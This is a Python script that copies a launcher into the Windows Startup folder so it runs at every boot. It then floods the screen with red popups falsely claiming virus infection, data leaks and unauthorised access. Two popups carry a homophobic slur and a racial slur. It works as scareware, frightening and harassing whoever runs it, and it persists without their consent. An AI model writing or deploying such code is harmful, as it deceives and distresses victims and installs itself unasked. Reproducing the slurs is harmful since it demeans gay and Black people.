import tkinter as tk
import threading
import time
import random
import os
import platform
import sys

# Function to display a single popup
def show_popup(title, message, x, y, size, color, btn1_text):
    def popup_thread():
        root = tk.Tk()
        root.withdraw()

        popup = tk.Toplevel(root)
        popup.title(title)
        popup.configure(bg=color)
        popup.geometry(f"{size}x{size}+{x}+{y}")

        tk.Label(popup, text=message, bg=color, wraplength=size-40).pack(pady=20, padx=20)
        btn1 = tk.Button(popup, text=btn1_text, command=popup.quit)
        btn1.pack(pady=10)

        popup.mainloop()
        root.quit()

    threading.Thread(target=popup_thread).start()

# Function to display multiple popups at random positions
def show_random_popups(messages, size, color, btn1_text, delay):
    screen_width = tk.Tk().winfo_screenwidth()
    screen_height = tk.Tk().winfo_screenheight()
    
    for idx, (title, message) in enumerate(messages):
        x = random.randint(0, screen_width - size)
        y = random.randint(0, screen_height - size)
        
        show_popup(title, message, x, y, size, color, btn1_text)
        time.sleep(delay)

# Function to auto-start the script on system boot (Windows example)
def auto_start():
    if platform.system() == "Windows":
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_path = os.path.realpath(__file__)
        bat_path = os.path.join(startup_dir, "popup_service.bat")
        with open(bat_path, 'w') as bat_file:
            bat_file.write(f'start /min pythonw {script_path}')

# Main function
if __name__ == '__main__':
    auto_start()  # Ensure the script auto-starts on system boot

    # Define default values
    size = 200  # Width and height of each popup
    color = "#FF0000"  # Red color for urgency
    btn1_text = "OK"
    delay = 0.1  # 2-second delay between popups

    # Define custom messages related to virus attacks and information leaks
    messages = [
        ("Warning!", "Your PC is being attacked by a virus!"),
        ("Alert!", "Your personal information might be leaked!"),
        ("Urgent!", "Unauthorized access detected on your system!"),
        ("Critical!", "Malware detected! Immediate action required!"),
        ("Danger!", "Suspicious activity detected on your PC!"),
        ("Alert!", "FAGGOT"),
        ("Alert!", "Virus detected! Your data could be compromised!"),
        ("Warning!", "Security breach detected! Protect your information!"),
        ("Critical!", "System vulnerability identified!"),
        ("Nigga!", "YOU ARE GAY")
    ]

    # Run the popups in a separate thread
    threading.Thread(target=show_random_popups, args=(messages, size, color, btn1_text, delay)).start()
